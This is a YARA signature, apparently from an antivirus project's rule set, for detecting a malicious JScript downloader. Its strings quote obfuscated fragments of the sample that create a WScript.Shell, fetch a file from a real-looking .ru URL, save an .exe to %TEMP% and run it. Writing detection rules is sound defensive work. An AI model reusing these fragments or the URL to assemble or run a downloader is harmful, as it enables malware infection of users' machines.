rule sig_20160401_95d2f740250c18c222b4469cfdbeb6d1 {
  meta:
    description = "datamaliciousorder - file 20160401_95d2f740250c18c222b4469cfdbeb6d1.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "2c83993a97464b453948aa5be59e34b089a60d80c334c5bc2110f6d884ab092d"

  strings:
    $s1  = "function JbyJc(DekUq, JvsIuf){FlyQm = FlyQm * 1; return DekUq - JvsIuf;};" fullword ascii
    $s2  = "var UkkPc = function UqHog() {return WScript[ImUk](\"WScript\"+\".Shell\");}(), LyzBt = 11;" fullword ascii
    $s3  = "QgGds[KunDuw](\"G\" + \"ET\", \"http://teamlight-pro.ru/j7esp\", false);" fullword ascii
    $s4  = "if (QgGds[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function OhBpj() {return UkkPc[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"vjQTk84h9.ex\" + \"e\";};" fullword ascii
    $s6  = "function NapFhs(){return ExuMrx + \"\";};" fullword ascii
    $s7  = "function SvOwo() {return ((AxIg == true) && (AxIg == KjhBln)) ? 1 : FlyQm;};" fullword ascii
    $s8  = "function HvmNt(MrkUu){UkkPc[\"R\"+\"un\"](MrkUu, FlyQm, FlyQm);};" fullword ascii
    $s9  = "var KjhBln = false;" fullword ascii
    $s10 = "}while (MlbNle);" fullword ascii
    $s11 = "KjhBln = true; " fullword ascii
    $s12 = "var AxIg = false;" fullword ascii
    $s13 = "var MldGq = new this[\"Date\"]();" fullword ascii
    $s14 = "function PyjNkw()" fullword ascii
    $s15 = "function FoHc(){return 23;};" fullword ascii
    $s16 = "function BuzDt(ByoTui) {var KtIow = (1, 2, 3, 4, 5, ByoTui); return KtIow;};" fullword ascii
    $s17 = "AxIg = true; " fullword ascii
    $s18 = "function EnxFqm(){return ImUk;};" fullword ascii
    $s19 = "var AtsNjx = false;" fullword ascii
    $s20 = "return JbyJc(TpLcg, CmsWul);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}